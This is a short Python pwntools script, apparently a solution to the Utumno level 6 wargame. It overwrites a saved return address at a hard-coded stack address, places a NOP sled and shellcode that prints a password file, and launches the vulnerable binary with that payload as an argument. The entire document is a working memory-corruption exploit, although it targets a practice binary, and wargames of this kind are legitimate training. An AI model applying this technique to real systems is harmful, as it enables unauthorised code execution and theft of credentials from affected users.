#!/usr/bin/python3

from pwn import *

filepath='./utumno_pass'
addr_eip = 0xffffce2c
addr_eip_hex = hex(addr_eip).split('x')[-1]

elf = context.binary = ELF('./utumno6')

payload = p32(addr_eip + 4 + 80)
payload += b'\x90' * 160
payload += asm(shellcraft.cat(filepath))

log.info(addr_eip_hex)

p = process(argv=['./utumno6', '-1', addr_eip_hex, payload.decode('latin-1')])

with open("payload.b", "wb") as file:
    file.write(payload)

log.info(p.recv(timeout=1))
